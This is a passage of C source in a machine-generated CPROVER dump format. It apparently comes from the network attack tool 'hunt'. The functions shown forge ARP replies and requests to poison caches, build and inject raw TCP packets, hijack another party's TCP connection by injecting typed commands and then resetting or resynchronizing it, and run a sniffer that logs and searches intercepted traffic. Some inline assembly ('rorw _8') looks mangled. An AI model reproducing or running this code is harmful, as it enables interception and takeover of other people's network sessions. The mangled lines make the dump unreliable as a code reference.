      break;

    return_value_list_count_5=list_count(slaves);
    if(return_value_list_count_5 >= 5)
      break;

    void *return_value_list_pop_6;
    return_value_list_pop_6=list_pop(requests);
    r = (struct req *)return_value_list_pop_6;
    void *return_value_malloc_7;
    return_value_malloc_7=malloc(sizeof(struct slave) /*40ul*/ );
    sl = (struct slave *)return_value_malloc_7;
    sl->s_req = *r;
    sl->s_timestamp=time((signed long int *)(void *)0);
    req = *r;
    free((void *)r);
    socketpair(1, 1, 0, pipe);
    sl->s_fd = pipe[(signed long int)0];
    sl->s_pid=fork();
    if(sl->s_pid == 0)
    {
      close(pipe[(signed long int)0]);
      close(fd);
      list_iter_set(&li, slaves);
      do
      {
        return_value_list_iter_get_8=list_iter_get(&li);
        sl = (struct slave *)return_value_list_iter_get_8;
        if(sl == ((struct slave *)NULL))
          break;

        close(sl->s_fd);
      }
      while((_Bool)1);
      list_iter_end(&li);
      resolv_slave(pipe[(signed long int)1]);
      exit(0);
    }

    else
      if(sl->s_pid >= 1)
      {
        close(pipe[(signed long int)1]);
        list_enqueue(slaves, (void *)sl);
        write(sl->s_fd, (const void *)&req, sizeof(struct req) /*16ul*/ );
      }

      else
        printf("err launching dns slave\n");
  }
  while((_Bool)1);
}

// send_src_spoof_to_dst
// file arpspoof.c line 76
static void send_src_spoof_to_dst(struct arp_spoof_info *asi)
{
  struct arp_spec as_dst;
  signed int i;
  unsigned char *tmp_if_expr_1;
  unsigned short int tmp_statement_expression_2;
  if(asi->dst_mac_valid == 0)
    fprintf(stderr, "error: try to send arp spoof without known dst mac\n");

  else
  {
    if(!(arp_spoof_with_my_mac == 0))
      tmp_if_expr_1 = my_eth_mac;

    else
      tmp_if_expr_1 = asi->src_fake_mac;
    as_dst.src_mac = (char *)tmp_if_expr_1;
    as_dst.dst_mac = (char *)asi->dst_mac;
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)2;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_2 = __v;
    as_dst.oper = (signed int)tmp_statement_expression_2;
    as_dst.sender_mac = (char *)asi->src_fake_mac;
    as_dst.sender_addr = (unsigned long int)asi->src_addr;
    as_dst.target_mac = (char *)asi->dst_mac;
    as_dst.target_addr = (unsigned long int)asi->dst_addr;
    i = 0;
    for( ; !(i >= arp_rr_count); i = i + 1)
      send_arp_packet(&as_dst);
  }
}

// send_src_spoof_to_dst_through_request
// file arpspoof.c line 108
static void send_src_spoof_to_dst_through_request(struct arp_spoof_info *asi, unsigned int ask_addr)
{
  struct arp_spec as_dst;
  signed int i;
  unsigned char *tmp_if_expr_1;
  unsigned short int tmp_statement_expression_2;
  if(asi->dst_mac_valid == 0)
    fprintf(stderr, "error: try to send arp spoof 2 without known dst mac\n");

  else
  {
    if(!(arp_spoof_with_my_mac == 0))
      tmp_if_expr_1 = my_eth_mac;

    else
      tmp_if_expr_1 = asi->src_fake_mac;
    as_dst.src_mac = (char *)tmp_if_expr_1;
    as_dst.dst_mac = (char *)asi->dst_mac;
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)1;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_2 = __v;
    as_dst.oper = (signed int)tmp_statement_expression_2;
    as_dst.sender_mac = (char *)asi->src_fake_mac;
    as_dst.sender_addr = (unsigned long int)asi->src_addr;
    as_dst.target_mac = (char *)mac_zero;
    as_dst.target_addr = (unsigned long int)ask_addr;
    i = 0;
    for( ; !(i >= arp_rr_count); i = i + 1)
      send_arp_packet(&as_dst);
  }
}

// send_tcp_packet
// file net.c line 37
signed int send_tcp_packet(struct tcp_spec *ts)
{
  signed int tot_len;
  signed int retval;
  char buf[2048l];
  char *data;
  struct ethhdr *eth;
  struct iphdr *ip;
  struct tcphdr *tcp;
  struct msghdr msg;
  struct sockaddr spkt;
  struct iovec iov;
  eth = (struct ethhdr *)buf;
  memcpy((void *)eth->h_dest, (const void *)ts->dst_mac, (unsigned long int)6);
  memcpy((void *)eth->h_source, (const void *)ts->src_mac, (unsigned long int)6);
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)0x0800;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  eth->h_proto = tmp_statement_expression_1;
  ip = (struct iphdr *)(eth + (signed long int)1);
  tcp = (struct tcphdr *)(ip + (signed long int)1);
  data = (char *)(tcp + (signed long int)1);
  memset((void *)ip, 0, sizeof(struct iphdr) /*20ul*/ );
  memset((void *)tcp, 0, sizeof(struct tcphdr) /*20ul*/ );
  memcpy((void *)data, (const void *)ts->data, (unsigned long int)ts->data_len);
  tcp->_anon0._anon1.dest = ts->dport;
  tcp->_anon0._anon1.source = ts->sport;
  tcp->_anon0._anon1.doff = (unsigned short int)5;
  tcp->_anon0._anon1.psh = (unsigned short int)ts->psh;
  tcp->_anon0._anon1.ack = (unsigned short int)ts->ack;
  tcp->_anon0._anon1.rst = (unsigned short int)ts->rst;
  tcp->_anon0._anon1.window = ts->window;
  ip->version = (unsigned int)4;
  ip->ihl = (unsigned int)5;
  tot_len = 20 + 20 + ts->data_len;
  unsigned short int tmp_statement_expression_2;
  unsigned short int send_tcp_packet__1__2____v;
  unsigned short int send_tcp_packet__1__2____x = (unsigned short int)tot_len;
  asm("rorw _8, %w0" : "=r"(send_tcp_packet__1__2____v) : "0"(send_tcp_packet__1__2____x) : "cc");
  tmp_statement_expression_2 = send_tcp_packet__1__2____v;
  ip->tot_len = tmp_statement_expression_2;
  ip->ttl = (unsigned char)64;
  ip->protocol = (unsigned char)6;
  unsigned short int tmp_statement_expression_3;
  unsigned short int send_tcp_packet__1__3____v;
  unsigned short int send_tcp_packet__1__3____x = (unsigned short int)0x4000;
  asm("rorw _8, %w0" : "=r"(send_tcp_packet__1__3____v) : "0"(send_tcp_packet__1__3____x) : "cc");
  tmp_statement_expression_3 = send_tcp_packet__1__3____v;
  ip->frag_off = tmp_statement_expression_3;
  ip->saddr = (unsigned int)ts->saddr;
  ip->daddr = (unsigned int)ts->daddr;
  ip->id = ts->id;
  ip->check = (unsigned short int)0;
  ip->check=in_cksum((unsigned short int *)ip, 20);
  tcp->_anon0._anon1.seq = (unsigned int)ts->seq;
  if(!(ts->ack == 0))
    tcp->_anon0._anon1.ack_seq = (unsigned int)ts->ack_seq;

  tcp->_anon0._anon1.check = (unsigned short int)0;
  tcp->_anon0._anon1.check=ip_in_cksum(ip, (unsigned short int *)tcp, (signed int)(sizeof(struct tcphdr) /*20ul*/  + (unsigned long int)ts->data_len));
  memset((void *)&spkt, 0, sizeof(struct sockaddr) /*16ul*/ );
  __builtin_strncpy(spkt.sa_data, eth_device, sizeof(char [14l]) /*14ul*/ );
  memset((void *)&msg, 0, sizeof(struct msghdr) /*56ul*/ );
  msg.msg_name = (void *)&spkt;
  msg.msg_namelen = (unsigned int)sizeof(struct sockaddr) /*16ul*/ ;
  msg.msg_iovlen = (unsigned long int)1;
  msg.msg_iov = &iov;
  iov.iov_base = (void *)buf;
  iov.iov_len = sizeof(struct ethhdr) /*14ul*/  + (unsigned long int)tot_len;
  retval=Sendmsg(linksock, &msg, (unsigned int)0);
  return retval;
}

// service_lookup
// file hunt.h line 454
unsigned short int service_lookup(char *name)
{
  struct servent *serv_ent;
  serv_ent=getservbyname(name, "tcp");
  unsigned short int tmp_statement_expression_1;
  if(serv_ent == ((struct servent *)NULL))
    return (unsigned short int)0;

  else
  {
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)serv_ent->s_port;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_1 = __v;
    return tmp_statement_expression_1;
  }
}

// set_tty_color
// file hunt.h line 406
void set_tty_color(enum TTY_COLOR color)
{
  set_tty_color_bg(color, (enum TTY_COLOR)COLOR_BLACK);
}

// set_tty_color_bg
// file util.c line 57
void set_tty_color_bg(enum TTY_COLOR fg, enum TTY_COLOR bg)
{
  char buf[32l];
  sprintf(buf, "\033[%d;4%d;3%dm", (signed int)fg / 8, (signed int)bg % 8, (signed int)fg % 8);
  fputs(buf, stdout);
}

// sig_slave_term
// file resolv.c line 173
static void sig_slave_term(signed int signum)
{
  resolv_slave_run = 0;
}

// sig_term
// file resolv.c line 235
static void sig_term(signed int signum)
{
  resolv_daemon_run = 0;
}

// simple_hijack
// file main.c line 231
void simple_hijack(void)
{
  char cmdbuf[256l];
  struct user_conn_info uci;
  signed int retval = 0;
  signed int c;
  signed int return_value_choose_connection_2;
  return_value_choose_connection_2=choose_connection(&uci);
  signed int return_value_user_hijack_sync_1;
  if(return_value_choose_connection_2 == 0)
  {
    c=menu_choose_char("dump connection y/n", "yn", (char)110);
    if(c == 121)
      dump_connection(&uci);

    do
    {
      set_tty_color((enum TTY_COLOR)COLOR_WHITE);
      fprintf(stdout, "Enter the command string you wish executed or [cr]> ");
      set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
      fflush(stdout);
      fgets(cmdbuf, (signed int)sizeof(char [256l]) /*256ul*/ , stdin);
      if((signed int)cmdbuf[0l] == 0x0a)
        break;

      retval=user_stormack_hijack(&uci, cmdbuf);
    }
    while(retval == 0);
    if(!(retval >= 1))
    {
      c=menu_choose_char("[r]eset connection/[s]ynchronize/[n]one", "rsn", (char)114);
      switch(c)
      {
        case 114:
        {
          user_rst(&uci, 1, 2);
          break;
        }
        case 115:
        {
          return_value_user_hijack_sync_1=user_hijack_sync(&uci);
          if(!(return_value_user_hijack_sync_1 == 0))
          {
            printf("\n");
            c=menu_choose_char("[r]eset connection/[n]one", "rn", (char)114);
            if(c == 114)
              user_rst(&uci, 1, 2);

          }

          else
            printf("\n");
        }
      }
    }

    printf("done\n");
  }

}

// sniff_add_item
// file sniff.c line 650
static void sniff_add_item(void)
{
  char buf[512l];
  char *buf_p;
  char file_name[512l];
  char file_name_buf[512l];
  struct sniff_info *si;
  unsigned int src_ip;
  unsigned int dst_ip;
  signed int src_mask;
  signed int dst_mask;
  signed int src_ports[17l];
  signed int dst_ports[17l];
  signed int srch_mode;
  signed int len;
  signed int log_mode;
  signed int log_bytes;
  signed int nr;
  struct _IO_FILE *f;
  signed int return_value_menu_choose_host_mask_ports_dfl_1;
  return_value_menu_choose_host_mask_ports_dfl_1=menu_choose_host_mask_ports_dfl("src ip addr/mask ports", &src_ip, (unsigned int *)&src_mask, (unsigned int *)src_ports, (unsigned int)0, (unsigned int)0, (signed int *)(void *)0);
  if(return_value_menu_choose_host_mask_ports_dfl_1 >= 0)
  {
    signed int return_value_menu_choose_host_mask_ports_dfl_2;
    return_value_menu_choose_host_mask_ports_dfl_2=menu_choose_host_mask_ports_dfl("dst ip addr/mask ports", &dst_ip, (unsigned int *)&dst_mask, (unsigned int *)dst_ports, (unsigned int)0, (unsigned int)0, (signed int *)(void *)0);
    if(return_value_menu_choose_host_mask_ports_dfl_2 >= 0)
    {
      buf_p = (char *)(void *)0;
      srch_mode = 98;
      signed int return_value_menu_choose_char_3;
      return_value_menu_choose_char_3=menu_choose_char("want to search for y/n", "yn", (char)121);
      if(return_value_menu_choose_char_3 == 121)
      {
        srch_mode=menu_choose_sdb("srch_mode", (char)98);
        if(srch_mode == -1)
          goto __CPROVER_DUMP_L17;

        signed int return_value_menu_choose_string_4;
        return_value_menu_choose_string_4=menu_choose_string("search for", buf, (signed int)sizeof(char [512l]) /*512ul*/ , (char *)(void *)0);
        if(!(return_value_menu_choose_string_4 >= 0))
          goto __CPROVER_DUMP_L17;

        buf_p = buf;
        goto __CPROVER_DUMP_L6;
      }


    __CPROVER_DUMP_L6:
      ;
      log_mode=menu_choose_sdb("log mode", (char)115);
      if(log_mode >= 0)
      {
        log_bytes=menu_choose_unr("log bytes", 0, 1000000000, 64);
        if(log_bytes >= 0)
        {
          signed int return_value_menu_choose_string_5;
          return_value_menu_choose_string_5=menu_choose_string("log file name [by conn]", file_name_buf, (signed int)sizeof(char [512l]) /*512ul*/ , (char *)(void *)0);
          if(!(return_value_menu_choose_string_5 >= 0))
            file_name_buf[(signed long int)0] = (char)0;

          signed int return_value_list_count_6;
          return_value_list_count_6=list_count(&l_sniff_db);
          signed int return_value_list_count_7;
          return_value_list_count_7=list_count(&l_sniff_db);
          nr=menu_choose_unr("insert at", 0, return_value_list_count_6, return_value_list_count_7);
          if(!(nr == -1))
          {
            if(!(file_name_buf[0l] == 0))
            {
              sprintf(file_name, "%s/%s", (const void *)".sniff", (const void *)file_name_buf);
              f=fopen(file_name, "a+");
              if(f == ((struct _IO_FILE *)NULL))
              {
                printf("can't open %s for writing\n", (const void *)file_name);
                goto __CPROVER_DUMP_L17;
              }

            }

            else
              f = (struct _IO_FILE *)(void *)0;
            void *return_value_malloc_8;
            return_value_malloc_8=malloc(sizeof(struct sniff_info) /*424ul*/ );
            si = (struct sniff_info *)return_value_malloc_8;
            memset((void *)si, 0, sizeof(struct sniff_info) /*424ul*/ );
            pthread_mutex_init(&si->mutex, (const union anonymous_9 *)(void *)0);
            pthread_cond_init(&si->lock_cond, (const union anonymous_9 *)(void *)0);
            si->lock_count = 0;
            list_init(&si->log, (signed int)((char *)&((struct sniff_log *)0)->next - (char *)0));
            si->src_addr = src_ip;
            si->src_mask = src_mask;
            port_htons((unsigned int *)src_ports);
            memcpy((void *)si->src_ports, (const void *)src_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
            si->dst_addr = dst_ip;
            si->dst_mask = dst_mask;
            port_htons((unsigned int *)dst_ports);
            memcpy((void *)si->dst_ports, (const void *)dst_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
            si->srch_mode=sdb_to_int((char)srch_mode);
            if(!(buf_p == ((char *)NULL)))
            {
              unsigned long int return_value_strlen_9;
              return_value_strlen_9=strlen(buf_p);
              len = (signed int)(return_value_strlen_9 + (unsigned long int)1);
              void *return_value_malloc_10;
              return_value_malloc_10=malloc((unsigned long int)len);
              si->search = (char *)return_value_malloc_10;
              /* assertion si->search */
              assert(si->search != ((char *)NULL));
              memcpy((void *)si->search, (const void *)buf_p, (unsigned long int)len);
            }

            si->log_mode=sdb_to_int((char)log_mode);
            si->log_bytes = log_bytes;
            if(!(f == ((struct _IO_FILE *)NULL)))
            {
              si->file = f;
              si->file_close = 1;
            }

            else
              si->file_close = 0;
            list_insert_at(&l_sniff_db, nr, (void *)si);
          }

        }

      }

    }

  }


__CPROVER_DUMP_L17:
  ;
}

// sniff_daemon_init
// file sniff.c line 502
static signed int sniff_daemon_init(void)
{
  struct stat stat_buf;
  signed int return_value_stat_3;
  return_value_stat_3=stat(".sniff", &stat_buf);
  if(return_value_stat_3 == 0)
  {
    if(!((61440u & stat_buf.st_mode) == 16384u))
    {
      printf(".sniff isn't directory\n");
      return -1;
    }

  }

  else
  {
    signed int *return_value___errno_location_2;
    return_value___errno_location_2=__errno_location();
    if(*return_value___errno_location_2 == 2)
    {
      signed int return_value_mkdir_1;
      return_value_mkdir_1=mkdir(".sniff", (unsigned int)0700);
      if(!(return_value_mkdir_1 >= 0))
      {
        printf(".sniff can't be created\n");
        return -1;
      }

      printf("directory .sniff created\n");
    }

    else
    {
      printf(".sniff error\n");
      return -1;
    }
  }
  return 0;
}

// sniff_del_item
// file sniff.c line 799
static void sniff_del_item(void)
{
  signed int i;
  struct sniff_info *si;
  sniff_list_db(0);
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_sniff_db);
  i=menu_choose_unr("item nr. to delete", 0, return_value_list_count_1 - 1, -1);
  if(i >= 0)
  {
    list_lock(&l_sniff_db);
    void *return_value_list_remove_at_2;
    return_value_list_remove_at_2=list_remove_at(&l_sniff_db, i);
    si = (struct sniff_info *)return_value_list_remove_at_2;
    sniff_info_wait_for_release(si);
    free_sniff_info(si);
    list_unlock(&l_sniff_db);
  }

}

// sniff_info_release
// file sniff.c line 80
static void sniff_info_release(struct sniff_info *si)
{
  pthread_mutex_lock(&si->mutex);
  si->lock_count = si->lock_count - 1;
  if(si->lock_count == 0)
    pthread_cond_broadcast(&si->lock_cond);

  pthread_mutex_unlock(&si->mutex);
}

// sniff_info_wait_for_release
// file sniff.c line 88
static void sniff_info_wait_for_release(struct sniff_info *si)
{
  pthread_mutex_lock(&si->mutex);
  while(si->lock_count >= 1)
    pthread_cond_wait(&si->lock_cond, &si->mutex);
  pthread_mutex_unlock(&si->mutex);
}

// sniff_info_want
// file sniff.c line 73
static void sniff_info_want(struct sniff_info *si)
{
  pthread_mutex_lock(&si->mutex);
  si->lock_count = si->lock_count + 1;
  pthread_mutex_unlock(&si->mutex);
}

// sniff_item_log_print
// file sniff.c line 596
static void sniff_item_log_print(struct _IO_FILE *f, signed int *l_nr, struct sniff_info *si)
{
  struct list_iterator li;
  struct sniff_log *slog;
  char *state;
  char host_buf[512l];
  list_iter_set(&li, &si->log);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    slog = (struct sniff_log *)return_value_list_iter_get_1;
    if(slog == ((struct sniff_log *)NULL))
      break;

    switch(slog->state)
    {
      case 2:
      {
        state = "LOG";
        break;
      }
      case 1:
      {
        state = "SRCH";
        break;
      }
      default:
        state = "ERR";
    }
    char *return_value_host_lookup_2;
    return_value_host_lookup_2=host_lookup(slog->src_addr, hl_mode);
    char *return_value_port_lookup_3;
    return_value_port_lookup_3=port_lookup(slog->src_port, hl_mode);
    sprintf(host_buf, "%s [%s]", return_value_host_lookup_2, return_value_port_lookup_3);
    char *return_value_host_lookup_4;
    return_value_host_lookup_4=host_lookup(slog->dst_addr, hl_mode);
    char *return_value_port_lookup_5;
    return_value_port_lookup_5=port_lookup(slog->dst_port, hl_mode);
    fprintf(f, "\t%-24s -> %s [%s] loged=%dB state=%s\n", (const void *)host_buf, return_value_host_lookup_4, return_value_port_lookup_5, slog->loged_bytes, state);
    *l_nr = *l_nr + 1;
    if(*l_nr % lines_o == 0)
      lines_o_press_key();

  }
  while((_Bool)1);
  list_iter_end(&li);
}

// sniff_item_print
// file sniff.c line 119
static void sniff_item_print(struct _IO_FILE *f, signed int i, struct sniff_info *si)
{
  char *str_srch_mode;
  char *str_log_mode;
  char buf_src_ports[512l];
  char buf_dst_ports[512l];
  char buf[512l];
  char *b;
  char host_buf[512l];
  str_srch_mode=sdbmode_to_char(si->srch_mode);
  str_log_mode=sdbmode_to_char(si->log_mode);
  sprintf_db_ports((unsigned int *)si->src_ports, buf_src_ports, (signed int)sizeof(char [512l]) /*512ul*/ , 1);
  sprintf_db_ports((unsigned int *)si->dst_ports, buf_dst_ports, (signed int)sizeof(char [512l]) /*512ul*/ , 1);
  b = buf;
  signed int return_value_sprintf_1;
  if(!(si->search == ((char *)NULL)))
  {
    return_value_sprintf_1=sprintf(b, "%s for X ", str_srch_mode);
    b = b + (signed long int)return_value_sprintf_1;
  }

  signed int return_value_sprintf_2;
  return_value_sprintf_2=sprintf(b, "log %s %dB", str_log_mode, si->log_bytes);
  b = b + (signed long int)return_value_sprintf_2;
  char *return_value_host_lookup_3;
  return_value_host_lookup_3=host_lookup(si->src_addr, hl_mode);
  signed int return_value_count_mask_4;
  return_value_count_mask_4=count_mask((unsigned int)si->src_mask);
  sprintf(host_buf, "%s/%d [%s]", return_value_host_lookup_3, return_value_count_mask_4, (const void *)buf_src_ports);
  char *return_value_host_lookup_5;
  return_value_host_lookup_5=host_lookup(si->dst_addr, hl_mode);
  signed int return_value_count_mask_6;
  return_value_count_mask_6=count_mask((unsigned int)si->dst_mask);
  fprintf(f, "%2d) %-22s --> %s/%d [%s] %s\n", i, (const void *)host_buf, return_value_host_lookup_5, return_value_count_mask_6, (const void *)buf_dst_ports, (const void *)buf);
}

// sniff_list_db
// file sniff.c line 631
static void sniff_list_db(signed int all)
{
  struct list_iterator li;
  struct sniff_info *si;
  signed int i = 0;
  signed int l_nr = 0;
  list_iter_set(&li, &l_sniff_db);
  void *return_value_list_iter_get_1;
  signed int tmp_post_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    si = (struct sniff_info *)return_value_list_iter_get_1;
    if(si == ((struct sniff_info *)NULL))
      break;

    tmp_post_2 = i;
    i = i + 1;
    sniff_item_print(stdout, tmp_post_2, si);
    l_nr = l_nr + 1;
    if(l_nr % lines_o == 0)
      lines_o_press_key();

    if(!(all == 0))
      sniff_item_log_print(stdout, &l_nr, si);

  }
  while((_Bool)1);
  list_iter_end(&li);
}

// sniff_log_item_print
// file sniff.c line 144
static void sniff_log_item_print(struct _IO_FILE *f, struct sniff_info *si, struct sniff_log *slog)
{
  char *direction;
  if(!(slog->src_to_dst == 0))
    direction = "-->";

  else
    direction = "<--";
  char *return_value_host_lookup_1;
  return_value_host_lookup_1=host_lookup(slog->src_addr, hl_mode);
  unsigned short int tmp_statement_expression_2;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)slog->src_port;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_2 = __v;
  char *return_value_host_lookup_3;
  return_value_host_lookup_3=host_lookup(slog->dst_addr, hl_mode);
  unsigned short int tmp_statement_expression_4;
  unsigned short int sniff_log_item_print__1__2____v;
  unsigned short int sniff_log_item_print__1__2____x = (unsigned short int)slog->dst_port;
  asm("rorw _8, %w0" : "=r"(sniff_log_item_print__1__2____v) : "0"(sniff_log_item_print__1__2____x) : "cc");
  tmp_statement_expression_4 = sniff_log_item_print__1__2____v;
  fprintf(f, "%s [%d] %s %s [%d]\n", return_value_host_lookup_1, tmp_statement_expression_2, direction, return_value_host_lookup_3, tmp_statement_expression_4);
}

// sniff_log_match
// file sniff.c line 293
char * sniff_log_match(struct packet *p, struct sniff_info *si, struct sniff_log *slog)
{
  struct iphdr *iph = p->p_iph;
  struct tcphdr *tcph = p->p_hdr.p_tcph;
  signed int m_src_to_dst;
  signed int m_dst_to_src;
  signed int find;
  char *log_data;
  char *retval = (char *)(void *)0;
  find = 0;
  m_dst_to_src = 0;
  m_src_to_dst = m_dst_to_src;
  if(iph->saddr == slog->src_addr)
  {
    if(iph->daddr == slog->dst_addr)
    {
      if(tcph->_anon0._anon1.source == slog->src_port)
      {
        if(tcph->_anon0._anon1.dest == slog->dst_port)
          m_src_to_dst = 1;

      }

    }

  }

  if(iph->daddr == slog->src_addr)
  {
    if(iph->saddr == slog->dst_addr)
    {
      if(tcph->_anon0._anon1.dest == slog->src_port)
      {
        if(tcph->_anon0._anon1.source == slog->dst_port)
          m_dst_to_src = 1;

      }

    }

  }

  _Bool tmp_if_expr_2;
  _Bool tmp_if_expr_1;
  _Bool tmp_if_expr_5;
  _Bool tmp_if_expr_4;
  if(m_dst_to_src == 0 && m_src_to_dst == 0)
    return (char *)(void *)0;

  else
  {
    log_data = p->p_data;
    switch(slog->state)
    {
      case 1:
      {
        if(si->srch_mode == 0)
          tmp_if_expr_2 = (_Bool)1;

        else
          tmp_if_expr_2 = si->srch_mode == 2 ? (_Bool)1 : (_Bool)0;
        if(!(m_src_to_dst == 0) && tmp_if_expr_2)
          find = 1;

        else
        {
          if(si->srch_mode == 1)
            tmp_if_expr_1 = (_Bool)1;

          else
            tmp_if_expr_1 = si->srch_mode == 2 ? (_Bool)1 : (_Bool)0;
          if(tmp_if_expr_1)
          {
            if(!(m_dst_to_src == 0))
              find = 1;

          }

        }
        if(!(find == 0))
        {
          if(!(si->search == ((char *)NULL)))
          {
            unsigned long int return_value_strlen_3;
            return_value_strlen_3=strlen(si->search);
            log_data=memfind(p->p_data, p->p_data_len, si->search, (signed int)return_value_strlen_3);
            if(!(log_data == ((char *)NULL)))
              slog->state = 2;

          }

          else
          {
            log_data = p->p_data;
            slog->state = 2;
          }
        }

        if(!(slog->state == 2))
          break;

      }
      case 2:
      {
        if(si->log_mode == 0)
          tmp_if_expr_5 = (_Bool)1;

        else
          tmp_if_expr_5 = si->log_mode == 2 ? (_Bool)1 : (_Bool)0;
        if(!(m_src_to_dst == 0) && tmp_if_expr_5)
          retval = log_data;

        else
        {
          if(si->log_mode == 1)
            tmp_if_expr_4 = (_Bool)1;

          else
            tmp_if_expr_4 = si->log_mode == 2 ? (_Bool)1 : (_Bool)0;
          if(tmp_if_expr_4)
          {
            if(!(m_dst_to_src == 0))
              retval = log_data;

          }

        }
        break;
      }
      default:
      {
        fprintf(stderr, "sniffer - bad state\n");
        retval = (char *)(void *)0;
      }
    }
    if(retval == ((char *)NULL))
      retval = (char *)(void *)1;

    return retval;
  }
}

// sniff_menu
// file hunt.h line 569
void sniff_menu(void)
{
  char *r_menu = "s/k)   start/stop sniff daemon\nl)     list sniff database   c) list sniff connection\na/m/d) add/mod/del sniff item\no)     options\nx)     return\n";
  char *r_keys = "sklcamdox";
  signed int run_it = 1;
  while(!(run_it == 0))
  {
    signed int return_value_menu_1;
    return_value_menu_1=menu("sniff daemon", r_menu, "sniff", r_keys, (char)0);
    switch(return_value_menu_1)
    {
      case 115:
      {
        start_sniff();
        break;
      }
      case 107:
      {
        stop_sniff();
        break;
      }
      case 108:
      {
        sniff_list_db(0);
        break;
      }
      case 99:
      {
        sniff_list_db(1);
        break;
      }
      case 97:
      {
        sniff_add_item();
        break;
      }
      case 109:
      {
        sniff_mod_item();
        break;
      }
      case 100:
      {
        sniff_del_item();
        break;
      }
      case 111:
      {
        sniff_options();
        break;
      }
      case 120:
        run_it = 0;
    }
  }
}

// sniff_mod_item
// file sniff.c line 729
static void sniff_mod_item(void)
{
  char buf[512l];
  char *buf_p;
  struct sniff_info *si;
  struct sniff_log *slog;
  unsigned int src_ip;
  unsigned int dst_ip;
  signed int src_mask;
  signed int dst_mask;
  signed int src_ports[17l];
  signed int dst_ports[17l];
  signed int srch_mode;
  signed int len;
  signed int log_mode;
  signed int log_bytes;
  signed int nr;
  sniff_list_db(0);
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_sniff_db);
  signed int return_value_list_count_2;
  return_value_list_count_2=list_count(&l_sniff_db);
  nr=menu_choose_unr("choose item", 0, return_value_list_count_1 - 1, return_value_list_count_2 - 1);
  void *return_value_list_pop_10;
  if(!(nr == -1))
  {
    void *return_value_list_at_3;
    return_value_list_at_3=list_at(&l_sniff_db, nr);
    si = (struct sniff_info *)return_value_list_at_3;
    if(!(si == ((struct sniff_info *)NULL)))
    {
      signed int return_value_menu_choose_host_mask_ports_dfl_4;
      return_value_menu_choose_host_mask_ports_dfl_4=menu_choose_host_mask_ports_dfl("src ip addr/mask ports", &src_ip, (unsigned int *)&src_mask, (unsigned int *)src_ports, si->src_addr, (unsigned int)si->src_mask, si->src_ports);
      if(return_value_menu_choose_host_mask_ports_dfl_4 >= 0)
      {
        signed int return_value_menu_choose_host_mask_ports_dfl_5;
        return_value_menu_choose_host_mask_ports_dfl_5=menu_choose_host_mask_ports_dfl("dst ip addr/mask ports", &dst_ip, (unsigned int *)&dst_mask, (unsigned int *)dst_ports, si->dst_addr, (unsigned int)si->dst_mask, si->dst_ports);
        if(return_value_menu_choose_host_mask_ports_dfl_5 >= 0)
        {
          buf_p = (char *)(void *)0;
          srch_mode = 98;
          signed int return_value_menu_choose_char_6;
          return_value_menu_choose_char_6=menu_choose_char("want to search for y/n", "yn", (char)121);
          if(return_value_menu_choose_char_6 == 121)
          {
            char return_value_int_to_sdb_7;
            return_value_int_to_sdb_7=int_to_sdb(si->srch_mode);
            srch_mode=menu_choose_sdb("srch_mode", return_value_int_to_sdb_7);
            if(!(srch_mode >= 0))
              goto __CPROVER_DUMP_L15;

            signed int return_value_menu_choose_string_8;
            return_value_menu_choose_string_8=menu_choose_string("search for", buf, (signed int)sizeof(char [512l]) /*512ul*/ , si->search);
            if(!(return_value_menu_choose_string_8 >= 0))
              goto __CPROVER_DUMP_L15;

            buf_p = buf;
            goto __CPROVER_DUMP_L8;
          }


        __CPROVER_DUMP_L8:
          ;
          char return_value_int_to_sdb_9;
          return_value_int_to_sdb_9=int_to_sdb(si->log_mode);
          log_mode=menu_choose_sdb("log mode", return_value_int_to_sdb_9);
          if(log_mode >= 0)
          {
            log_bytes=menu_choose_unr("log bytes", 0, 1000000000, si->log_bytes);
            if(log_bytes >= 0)
            {
              port_htons((unsigned int *)src_ports);
              port_htons((unsigned int *)dst_ports);
              list_lock(&l_sniff_db);
              pthread_mutex_lock(&si->mutex);
              while(si->lock_count >= 1)
                pthread_cond_wait(&si->lock_cond, &si->mutex);
              do
              {
                return_value_list_pop_10=list_pop(&si->log);
                slog = (struct sniff_log *)return_value_list_pop_10;
                if(slog == ((struct sniff_log *)NULL))
                  break;

                free_sniff_log(slog);
              }
              while((_Bool)1);
              si->src_addr = src_ip;
              si->src_mask = src_mask;
              memcpy((void *)si->src_ports, (const void *)src_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
              si->dst_addr = dst_ip;
              si->dst_mask = dst_mask;
              memcpy((void *)si->dst_ports, (const void *)dst_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
              si->srch_mode=sdb_to_int((char)srch_mode);
              if(!(buf_p == ((char *)NULL)))
              {
                free((void *)si->search);
                unsigned long int return_value_strlen_11;
                return_value_strlen_11=strlen(buf_p);
                len = (signed int)(return_value_strlen_11 + (unsigned long int)1);
                void *return_value_malloc_12;
                return_value_malloc_12=malloc((unsigned long int)len);
                si->search = (char *)return_value_malloc_12;
                /* assertion si->search */
                assert(si->search != ((char *)NULL));
                memcpy((void *)si->search, (const void *)buf_p, (unsigned long int)len);
              }

              si->log_mode=sdb_to_int((char)log_mode);
              si->log_bytes = log_bytes;
              pthread_mutex_unlock(&si->mutex);
              list_unlock(&l_sniff_db);
            }

          }

        }

      }

    }

  }


__CPROVER_DUMP_L15:
  ;
}

// sniff_options
